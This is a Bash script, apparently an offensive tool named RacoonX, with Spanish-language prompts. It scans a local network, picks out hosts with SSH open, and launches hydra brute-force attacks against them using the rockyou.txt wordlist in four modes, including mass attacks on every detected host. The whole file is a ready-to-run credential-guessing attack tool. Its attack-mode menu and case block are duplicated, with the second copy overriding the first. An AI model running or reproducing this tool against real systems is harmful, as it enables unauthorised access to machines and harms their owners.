#!/bin/bash

# RacoonX - By montaosx - SSH_BruteForce


# Colores
AZUL='\033[1;34m'
LAVANDA='\033[1;35m'
AMARILLO='\033[1;33m'
CYAN='\033[1;36m'
VERDE='\033[1;32m'
ROJO='\033[1;31m'
RESET='\033[0m'

source functions/ctrl_c.sh
source functions/procesar_ips.sh
source functions/seleccionInterfaz.sh
source functions/create_workspace.sh
source functions/hostScan.sh
source functions/SoDetect.sh
source functions/portScan.sh

function activeSSH(){
    > activeSSH.txt 
    for ip in "${ips_detectadas[@]}"; do
        if timeout 1 bash -c "echo >/dev/tcp/$ip/22" 2>/dev/null; then
            echo "$ip -- ACTIVE SSH" >> activeSSH.txt
            echo "$ip" >> onlyActiveSSH.txt
        else 
            echo "$ip" >> activeSSH.txt
        fi
    done

    echo -e "${AZUL}[+]${RESET} ${LAVANDA}HOSTS DETECTATADOS${LAVANDA}:${RESET} "

    mapfile -t ssh_activos < activeSSH.txt
    for ((i=0; i<${#ssh_activos[@]}; i++)); do
        num=$((i+1))
        echo -e "${AZUL}$num -${RESET} ${AMARILLO}${ssh_activos[$i]}${RESET}"
    done
}

function lanzarAtaque() {
    echo -e "\n${AZUL}[+]${RESET} ${LAVANDA}Iniciando ataques SSH sobre${RESET} ${AZUL}${#objetivos[@]}${RESET} ${LAVANDA}host(s)...${RESET}"

    for ip in "${objetivos[@]}"; do
        echo -e "\n${AZUL}[+]${RESET} ${LAVANDA}Atacando${RESET} ${AZUL}$ip${RESET}..."

        case "$ataque_tipo" in
            usuario_fijo)
                echo -e "${AZUL}[>]${RESET} ${LAVANDA}Usuario${LAVANDA}:${RESET} ${AMARILLO}$usuario${RESET} ${LAVANDA}| Diccionario${LAVANDA}:${RESET} ${AMARILLO}$diccionario${RESET}"
                hydra -l "$usuario" -P "$diccionario" ssh://"$ip" -s 22 -t 15
                ;;
            password_fija)
                echo -e "${AZUL}[>]${RESET} ${LAVANDA}Contraseña${LAVANDA}:${RESET} ${AMARILLO}$password${RESET} ${LAVANDA}| Diccionario${LAVANDA}:${RESET} ${AMARILLO}$diccionario${RESET}"
                hydra -L "$diccionario" -p "$password" ssh://"$ip" -s 22 -t 15
                ;;
            ambos_diccionario)
                echo -e "${AZUL}[>]${RESET} ${LAVANDA}Diccionario de usuarios${LAVANDA}:${RESET} ${AMARILLO}$usuario_dic${RESET} ${LAVANDA}| Diccionario de contraseñas${LAVANDA}:${RESET} ${AMARILLO}$password_dic${RESET}"
                hydra -L "$usuario_dic" -P "$password_dic" ssh://"$ip" -s 22 -t 15
                ;;
            validacion_directa)
                echo -e "${AZUL}[>]${RESET} ${LAVANDA}Validando credenciales -> Usuario${LAVANDA}:${RESET} ${AMARILLO}$usuario${RESET} ${LAVANDA}| Contraseña${LAVANDA}:${RESET} ${AMARILLO}********${RESET}"
                hydra -l "$usuario" -p "$password" ssh://"$ip" -s 22 -t 15
                ;;
            *)
                echo -e "${ROJO}[!]${RESET} ${ROJO}Tipo de ataque desconocido.${RESET}"
                ;;
        esac
    done

    echo -e "\n${VERDE}[✓]${RESET} ${VERDE}Ataques finalizados.${RESET}"
}



trap ctrl_c SIGINT
let -i numeroInterfaces=$(ifconfig | awk '/^[a-z]/ {iface=$1} /inet / && $2 != "127.0.0.1" {print iface, $2}' | wc -l)
seleccionInterfaz
create_workspace
hostScan
activeSSH
echo -e "\n${AZUL}[+]${RESET} ${LAVANDA}Opciones especiales${LAVANDA}:${RESET}"
echo -e "  ${AMARILLO}ALL${RESET}  ${AZUL}-${RESET} ${LAVANDA}Atacar a todos los hosts detectados${RESET}"
echo -e "  ${AMARILLO}SSH-ACTIVE${RESET}  ${AZUL}-${RESET} ${LAVANDA}Atacar a todos los hosts detectados con SSH activo${RESET}"
echo -e "  ${AMARILLO}IP${RESET}   ${AZUL}-${RESET} ${LAVANDA}Introducir IPs manualmente${RESET} ${AZUL}(ej: 192.168.0.10 192.168.0.22...)${RESET}"

echo -e "\n${AZUL}[+]${RESET} ${LAVANDA}Seleccione los hosts a atacar${LAVANDA}:${RESET}"
echo -e "  ${AZUL}➤${RESET} ${LAVANDA}Introduzca uno o varios números separados por espacios${RESET} ${AZUL}(ej: 1 3 5 7...)${RESET}"
echo -e "  ${AZUL}➤${RESET} ${LAVANDA}O escriba${RESET} ${AZUL}ALL${RESET} ${LAVANDA}/${RESET} ${AZUL}IP${RESET} ${LAVANDA}/${RESET} ${AZUL}SSH-ACTIVE${RESET} ${LAVANDA}según el caso${RESET}"

read -p "$(echo -e "\n${LAVANDA}Selección${LAVANDA}:${RESET} ")" hosts_a_atacar

objetivos=()  # Array final de IPs seleccionadas
declare -A vistos  # Para evitar duplicados

case "$hosts_a_atacar" in
    ALL)
        objetivos=("${ips_detectadas[@]}")
        ;;
    SSH-ACTIVE)
        if [[ -s onlyActiveSSH.txt ]]; then
            mapfile -t objetivos < onlyActiveSSH.txt
        else
            echo -e "${ROJO}[!]${RESET} ${ROJO}No se detectaron hosts con SSH activo.${RESET}"
            exit 1
        fi
        ;;
    IP)
        read -p "$(echo -e "${AZUL}➤${RESET} ${LAVANDA}Introduzca una o más IPs separadas por espacio${LAVANDA}:${RESET} ")" -a objetivos
        ;;
    *)
        # Procesar como números
        read -a numeros <<< "$hosts_a_atacar"

        for num in "${numeros[@]}"; do
            # Validar que sea número
            if ! [[ "$num" =~ ^[0-9]+$ ]]; then
                echo -e "${ROJO}[!]${RESET} ${ROJO}'$num' no es un número válido.${RESET}"
                exit 1
            fi

            # Validar rango (1 hasta longitud del array ssh_activos)
            if (( num < 1 || num > ${#ssh_activos[@]} )); then
                echo -e "${ROJO}[!]${RESET} ${ROJO}'$num' está fuera de rango. Debe estar entre 1 y ${#ssh_activos[@]}.${RESET}"
                exit 1
            fi

            # Validar duplicado
            if [[ ${vistos[$num]} ]]; then
                echo -e "${ROJO}[!]${RESET} ${ROJO}El número '$num' está repetido.${RESET}"
                exit 1
            fi

            vistos[$num]=1  # Marcar como ya usado

            # Extraer solo la IP de la línea
            index=$((num - 1))
            ip=$(echo "${ssh_activos[$index]}" | awk '{print $1}')
            objetivos+=("$ip")
        done
        ;;
esac


# Mostrar resultado final
echo -e "\n${VERDE}[✓]${RESET} ${VERDE}Objetivo(s) seleccionado(s)${VERDE}:${RESET}"
for ip in "${objetivos[@]}"; do
    echo -e "  - ${AMARILLO}${ip}${RESET}"
done

echo -e "\n${AZUL}[+]${RESET} ${LAVANDA}Seleccione el tipo de ataque SSH${LAVANDA}:${RESET}"
echo -e "  ${LAVANDA}1)${RESET} ${AMARILLO}Usuario conocido${RESET} ${LAVANDA}- Contraseña con diccionario (por defecto${LAVANDA}:${RESET} ${AZUL}rockyou.txt${RESET})"
echo -e "  ${LAVANDA}2)${RESET} ${AMARILLO}Usuario con diccionario${RESET} ${LAVANDA}- Contraseña conocida (por defecto${LAVANDA}:${RESET} ${AZUL}rockyou.txt${RESET})"
echo -e "  ${LAVANDA}3)${RESET} ${AMARILLO}Ambos con diccionario${RESET} ${LAVANDA}- (usuario común + rockyou.txt)${RESET}"
echo -e "  ${LAVANDA}4)${RESET} ${AMARILLO}Credenciales conocidas${RESET} ${LAVANDA}- validar acceso directo${RESET}"

read -p "$(echo -e "\n${LAVANDA}Opción${LAVANDA} > ${RESET}")" modo_ataque

# Ruta por defecto al diccionario rockyou.txt (puedes ajustar si lo tienes en otro sitio)
diccionario_defecto="/usr/share/wordlists/rockyou.txt"

case "$modo_ataque" in
    1)
        read -p "$(echo -e "${AZUL}➤${RESET} ${LAVANDA}Introduce el nombre de usuario conocido${LAVANDA}:${RESET} ")" usuario
        read -p "$(echo -e "${AZUL}➤${RESET} ${LAVANDA}Ruta al diccionario de contraseñas${LAVANDA} [Enter para usar rockyou.txt]${LAVANDA}:${RESET} ")" diccionario
        [[ -z "$diccionario" ]] && diccionario="$diccionario_defecto"
        ataque_tipo="usuario_fijo"
        ;;
    2)
        read -p "$(echo -e "${AZUL}➤${RESET} ${LAVANDA}Introduce la contraseña conocida${LAVANDA}:${RESET} ")" password
        read -p "$(echo -e "${AZUL}➤${RESET} ${LAVANDA}Ruta al diccionario de usuarios${LAVANDA} [Enter para usar rockyou.txt]${LAVANDA}:${RESET} ")" diccionario
        [[ -z "$diccionario" ]] && diccionario="$diccionario_defecto"
        ataque_tipo="password_fija"
        ;;
    3)
        usuario="root"
        password=""
        diccionario="$diccionario_defecto"
        echo -e "${AZUL}➤${RESET} ${LAVANDA}Usuario por defecto${LAVANDA}:${RESET} ${AMARILLO}$usuario${RESET}"
        echo -e "${AZUL}➤${RESET} ${LAVANDA}Diccionario${LAVANDA}:${RESET} ${AMARILLO}$diccionario${RESET}"
        ataque_tipo="ambos_diccionario"
        ;;
    4)
        read -p "$(echo -e "${AZUL}➤${RESET} ${LAVANDA}Introduce el nombre de usuario${LAVANDA}:${RESET} ")" usuario
        read -s -p "$(echo -e "${AZUL}➤${RESET} ${LAVANDA}Introduce la contraseña${LAVANDA}:${RESET} ")" password
        echo ""
        ataque_tipo="validacion_directa"
        ;;
    *)
        echo -e "${ROJO}[!]${RESET} ${ROJO}Opción inválida. Saliendo.${RESET}"
        exit 1
        ;;
esac

# Ruta por defecto al diccionario rockyou.txt
diccionario_defecto="/usr/share/wordlists/rockyou.txt"

echo -e "\n${AZUL}[+]${RESET} ${LAVANDA}Seleccione el tipo de ataque SSH${LAVANDA}:${RESET}"
echo -e "  ${LAVANDA}1)${RESET} ${AZUL}Usuario conocido${RESET} - Contraseña con diccionario (por defecto${LAVANDA}:${RESET} ${AZUL}rockyou.txt${RESET})"
echo -e "  ${LAVANDA}2)${RESET} ${AZUL}Usuario con diccionario${RESET} - Contraseña conocida (por defecto${LAVANDA}:${RESET} ${AZUL}rockyou.txt${RESET})"
echo -e "  ${LAVANDA}3)${RESET} ${AZUL}Ambos con diccionario${RESET} (usuario y contraseña desde ${AZUL}rockyou.txt${RESET} o personalizados)"
echo -e "  ${LAVANDA}4)${RESET} ${AZUL}Credenciales conocidas${RESET} (validar acceso directo)"

read -p "$(echo -e "\n${LAVANDA}Opción${LAVANDA} > ${RESET}")" modo_ataque

case "$modo_ataque" in
    1)
        read -p "$(echo -e "${AZUL}➤${RESET} ${LAVANDA}Introduce el nombre de usuario conocido${LAVANDA}:${RESET} ")" usuario
        read -p "$(echo -e "${AZUL}➤${RESET} ${LAVANDA}Ruta al diccionario de contraseñas${LAVANDA} [Enter para usar rockyou.txt]${LAVANDA}:${RESET} ")" diccionario
        [[ -z "$diccionario" ]] && diccionario="$diccionario_defecto"
        ataque_tipo="usuario_fijo"
        ;;
    2)
        read -p "$(echo -e "${AZUL}➤${RESET} ${LAVANDA}Introduce la contraseña conocida${LAVANDA}:${RESET} ")" password
        read -p "$(echo -e "${AZUL}➤${RESET} ${LAVANDA}Ruta al diccionario de usuarios${LAVANDA} [Enter para usar rockyou.txt]${LAVANDA}:${RESET} ")" diccionario
        [[ -z "$diccionario" ]] && diccionario="$diccionario_defecto"
        ataque_tipo="password_fija"
        ;;
    3)
        echo -e "${AZUL}➤${RESET} ${LAVANDA}Diccionario por defecto para usuarios y contraseñas${LAVANDA}:${RESET} ${AMARILLO}$diccionario_defecto${RESET}"
        
        read -p "$(echo -e "${AZUL}➤${RESET} ${LAVANDA}Ruta al diccionario de usuarios${LAVANDA} [Enter para usar rockyou.txt]${LAVANDA}:${RESET} ")" usuario_dic
        [[ -z "$usuario_dic" ]] && usuario_dic="$diccionario_defecto"
        
        read -p "$(echo -e "${AZUL}➤${RESET} ${LAVANDA}Ruta al diccionario de contraseñas${LAVANDA} [Enter para usar rockyou.txt]${LAVANDA}:${RESET} ")" password_dic
        [[ -z "$password_dic" ]] && password_dic="$diccionario_defecto"
        
        echo -e "   ${AZUL}➤${RESET} ${LAVANDA}Diccionario de usuarios${LAVANDA}:${RESET} ${AMARILLO}$usuario_dic${RESET}"
        echo -e "   ${AZUL}➤${RESET} ${LAVANDA}Diccionario de contraseñas${LAVANDA}:${RESET} ${AMARILLO}$password_dic${RESET}"
        
        ataque_tipo="ambos_diccionario"
        ;;
    4)
        read -p "$(echo -e "${AZUL}➤${RESET} ${LAVANDA}Introduce el nombre de usuario${LAVANDA}:${RESET} ")" usuario
        read -s -p "$(echo -e "${AZUL}➤${RESET} ${LAVANDA}Introduce la contraseña${LAVANDA}:${RESET} ")" password
        echo ""
        ataque_tipo="validacion_directa"
        ;;
    *)
        echo -e "${ROJO}[!]${RESET} ${ROJO}Opción inválida. Saliendo.${RESET}"
        exit 1
        ;;
esac
